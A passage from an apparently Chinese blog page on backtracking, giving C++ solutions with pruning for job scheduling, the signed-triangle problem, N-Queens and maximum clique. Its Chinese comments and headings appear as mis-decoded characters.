å‰ªæï¼ˆè‹¥å½“å‰ç´¯è®¡å’Œå·²ç»å¤§äºç­‰äºæœ€ä¼˜è§£ï¼Œåˆ™ä¸ç»§ç»­å‘ä¸‹æœç´¢ï¼‰</span><span class="token function">swap</span><span class="token punctuation">(</span>curSche<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">swap</span><span class="token punctuation">(</span>curSche<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// å›æº¯</span>f1 <span class="token operator">-=</span> jobs<span class="token punctuation">[</span>curSche<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>curSum <span class="token operator">-=</span> f2<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// é€’å½’æœç´¢</span><span class="token comment">// æ‰“å°æœ€ä¼˜è°ƒåº¦æ–¹æ¡ˆ</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> optimSche<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">"->"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="ç¬¦å·ä¸‰è§’å½¢é—®é¢˜"><a href="#ç¬¦å·ä¸‰è§’å½¢é—®é¢˜" class="headerlink" title="ç¬¦å·ä¸‰è§’å½¢é—®é¢˜"></a>ç¬¦å·ä¸‰è§’å½¢é—®é¢˜</h1><h2 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/signed.png"></p><h2 id="è§£é¢˜ä»£ç -2"><a href="#è§£é¢˜ä»£ç -2" class="headerlink" title="è§£é¢˜ä»£ç "></a>è§£é¢˜ä»£ç </h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">signedTriangle</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> num <span class="token operator">=</span> n <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// ä¸‰è§’å½¢ç¬¦å·æ€»æ•°</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// æ€»æ•°ä¸ºå¥‡æ•°ï¼Œä¸å¯èƒ½ç›¸ç­‰</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">triangles</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// falseä»£è¡¨'+',trueä»£è¡¨'-'</span><span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// åˆæ³•å›¾å½¢ä¸ªæ•°</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">>></span> fullShape<span class="token punctuation">;</span> <span class="token comment">// æ‰€æœ‰åˆæ³•å›¾å½¢</span><span class="token comment">// é€’å½’æœç´¢å‡½æ•°</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// åˆ°è¾¾æœ€å¤§æœç´¢æ·±åº¦ï¼Œåˆ¤æ–­æ˜¯å¦å¯è¡Œ</span><span class="token keyword">int</span> pCnt <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> sCnt <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// å‰©ä½™'+','-'çš„ç¬¦å·ä¸ªæ•°</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> newShape<span class="token punctuation">;</span> <span class="token comment">// å½“å‰å›¾å½¢</span>queue<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> q<span class="token punctuation">,</span> nq<span class="token punctuation">;</span> <span class="token comment">// è½®æ¢é˜Ÿåˆ—</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å°†ç¬¬ä¸€è¡Œç¬¦å·åŠ å…¥é˜Ÿåˆ—</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token punctuation">(</span>triangles<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">?</span> sCnt <span class="token operator">:</span> pCnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">bool</span> ft <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">bool</span> nt <span class="token operator">=</span> ft <span class="token operator">^</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// é˜Ÿåˆ—å‰ä¸¤ä¸ªç¬¦å·å¼‚æˆ–å¾—åˆ°ä¸‹é¢çš„ç¬¦å·</span>nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>nt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token punctuation">(</span>nt <span class="token operator">?</span> sCnt <span class="token operator">:</span> pCnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sCnt <span class="token operator">*</span> pCnt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// å…¶ä¸­ä¸€ä¸ªç¬¦å·ä¸ªæ•°è¶…è¿‡ä¸€åŠ</span>newShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>q <span class="token operator">=</span> <span class="token function">move</span><span class="token punctuation">(</span>nq<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// é˜Ÿåˆ—è½®æ¢ï¼ˆåˆ©ç”¨å³å€¼å¼•ç”¨è¿›è¡Œèµ„æºæ‰€æœ‰æƒçš„äº¤æ¢ï¼‰</span><span class="token punctuation">&#125;</span><span class="token comment">// è¯¥ç»“æœåˆæ³•</span><span class="token operator">++</span>res<span class="token punctuation">;</span>fullShape<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>newShape<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>triangles<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>triangles<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// é€’å½’æœç´¢</span><span class="token comment">// æ‰“å°æ‰€æœ‰åˆæ³•å›¾å½¢</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> shape <span class="token operator">:</span> fullShape<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> col <span class="token operator">=</span> n<span class="token punctuation">;</span> col <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">--</span>col<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> di <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> col<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> col <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> col<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> shape<span class="token punctuation">[</span>i <span class="token operator">+</span> di<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="Nçš‡å"><a href="#Nçš‡å" class="headerlink" title="Nçš‡å"></a>Nçš‡å</h1><h2 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/nq.png"></p><h2 id="è§£é¢˜ä»£ç -3"><a href="#è§£é¢˜ä»£ç -3" class="headerlink" title="è§£é¢˜ä»£ç "></a>è§£é¢˜ä»£ç </h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> <span class="token function">solveNQueens</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span> res<span class="token punctuation">;</span> <span class="token comment">// å­˜æ”¾æ‰€æœ‰è§£</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">chessBoard</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å½“å‰æ£‹ç›˜çŠ¶æ€</span>    <span class="token comment">// æ£€æŸ¥è¯¥ä½ç½®(r,c)æ˜¯å¦èƒ½å¤Ÿæ”¾ç½®æ£‹å­</span>    <span class="token keyword">auto</span> check <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// ä»ä¸Šå¾€ä¸‹ä¾æ¬¡æ£€æŸ¥æ£‹ç›˜ç¬¬cåˆ—æ˜¯å¦å·²æ”¾ç½®æ£‹å­</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>chessBoard<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// ä»ä¸‹å¾€ä¸Šä¾æ¬¡æ£€æŸ¥å·¦æ–œä¸Šæ–¹æ˜¯å¦å·²æ”¾ç½®æ£‹å­</span>            <span class="token keyword">int</span> li <span class="token operator">=</span> r <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> lj <span class="token operator">=</span> c <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>li <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> lj <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> chessBoard<span class="token punctuation">[</span>li<span class="token punctuation">]</span><span class="token punctuation">[</span>lj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// ä»ä¸‹å¾€ä¸Šä¾æ¬¡æ£€æŸ¥å³æ–œä¸Šæ–¹æ˜¯å¦å·²æ”¾ç½®æ£‹å­</span>            <span class="token keyword">int</span> ri <span class="token operator">=</span> r <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> rj <span class="token operator">=</span> c <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ri <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> rj <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> chessBoard<span class="token punctuation">[</span>ri<span class="token punctuation">]</span><span class="token punctuation">[</span>rj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Q'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// é€’å½’æœç´¢å‡½æ•°</span>    function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// åˆ°è¾¾æœ€å¤§æ·±åº¦ï¼Œå¾—åˆ°ä¸€ä¸ªåˆæ³•è§£</span>            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// å½“å‰ä½ç½®ä¸å¯æ”¾ç½®</span>            chessBoard<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Q'</span><span class="token punctuation">;</span> <span class="token comment">// æ”¾ç½®æ£‹å­</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            chessBoard<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span> <span class="token comment">// å›æº¯</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="æœ€å¤§å›¢é—®é¢˜"><a href="#æœ€å¤§å›¢é—®é¢˜" class="headerlink" title="æœ€å¤§å›¢é—®é¢˜"></a>æœ€å¤§å›¢é—®é¢˜</h1><h2 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/group.png"></p><h2 id="è§£é¢˜ä»£ç -4"><a href="#è§£é¢˜ä»£ç -4" class="headerlink" title="è§£é¢˜ä»£ç "></a>è§£é¢˜ä»£ç </h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// å›¾çš„é‚»æ¥çŸ©é˜µå½¢å¼</span><span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// é¡¶ç‚¹æ•°ç»„ï¼ˆå…ƒç´ ä¸ºå­—ç¬¦ç±»å‹ï¼‰</span><span class="token comment">// é‚»æ¥çŸ©é˜µï¼Œedges[u][v] == INT32_MAX ? æ— è¾¹ : å­˜åœ¨æƒå€¼ä¸ºedges[u][v]çš„è¾¹</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span> <span class="token function">largestGroup</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// é¡¶ç‚¹ä¸ªæ•°</span> <span class="token comment">// æ‰€æœ‰çš„æœ€å¤§å›¢ï¼ˆæ¯ä¸ªæœ€å¤§å›¢ä¸ºä¸€ä¸ªcharç±»å‹æ•°ç»„ï¼Œå…¶ä¸­å…ƒç´ ä¸ºæœ€å¤§å›¢é¡¶ç‚¹ï¼‰</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span> res<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curGroup</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å½“å‰å›¢</span><span class="token keyword">int</span> maxSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// å›¢çš„æœ€å¤§é¡¶ç‚¹æ•°</span><span class="token comment">// é€’å½’æœç´¢å‡½æ•°ï¼Œidxä¸ºæœç´¢æ·±åº¦ï¼ŒcurSizeä¸ºå½“å‰æœç´¢çŠ¶æ€ä¸‹å›¢çš„é¡¶ç‚¹ä¸ªæ•°</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> curSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// åˆ°è¾¾æœ€å¤§æœç´¢æ·±åº¦</span><span class="token comment">// æ„é€ æœ€å¤§å›¢</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> group<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curGroup<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>group<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// æ›´æ–°æœ€ä¼˜è§£</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curSize <span class="token operator">></span> maxSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>maxSize <span class="token operator">=</span> curSize<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// åˆ¤æ–­å½“å‰ç»“ç‚¹idxæ˜¯å¦èƒ½å¤Ÿä¸å½“å‰å›¢çš„æ¯ä¸ªç»“ç‚¹ç›¸è¿</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> idx<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curGroup<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> INT32_MAX<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å¦‚æœç›¸è¿ï¼Œåˆ™æ„æˆä¸€ä¸ªæ›´å¤§çš„å›¢ï¼Œç»§ç»­å‘ä¸‹æœç´¢</span>curGroup<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// åŠ å…¥å›¢</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> curSize <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>curGroup<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// å›æº¯</span><span class="token punctuation">&#125;</span><span class="token comment">// å‰ªæï¼Œè‹¥æ»¡è¶³curSize + n - idx &lt;= maxSize</span><span class="token comment">// åˆ™ä¸å¯èƒ½å¾—åˆ°æ¯”å½“å‰æœ€å¤§å›¢æ›´å¤§çš„å›¢ï¼Œæ— éœ€ç»§ç»­æœç´¢</span><span class="token keyword">if</span> <span class="token punctuation">(</span>curSize <span class="token operator">+</span> n <span class="token operator">-</span> idx <span class="token operator">></span> maxSize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> curSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token 